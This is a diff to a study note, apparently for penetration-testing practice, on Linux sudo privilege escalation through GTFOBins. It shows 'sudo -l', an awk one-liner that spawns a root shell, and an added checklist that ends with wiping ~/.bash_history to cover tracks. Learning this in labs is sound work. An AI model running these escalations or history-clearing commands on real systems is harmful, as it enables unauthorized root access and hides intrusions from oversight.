@@ -12,7 +12,7 @@ sudo -l
 
 # GTFOBins
 
-This is an important tool used to perform this privilege escalation technique
+<mark style="background: #BBFABBA6;">This is an important tool used to perform this privilege escalation technique</mark>
 -  [https://gtfobins.github.io/](https://gtfobins.github.io/)
 
 <mark style="background: #FF5582A6;">This is the most important one!</mark>
@@ -43,3 +43,16 @@ sudo awk 'BEGIN {system("/bin/bash")}'
 
 This resource is very useful to test for privilege escalation in different ways:
 - [https://tryhackme.com/room/privescplayground](https://tryhackme.com/room/privescplayground)
+
+# STEP TO PERFORM
+
+- [ ] **List commands we can run as sudo**
+- `sudo -l`
+
+- [ ] **Search in GTFOBins as `SUDO`**
+- [https://gtfobins.github.io/](https://gtfobins.github.io/)
+
+- [ ] **Execute the commands given by GTFOBins**
+
+- [ ] **Clean the history**
+- `echo "" > ~/.bash_history`
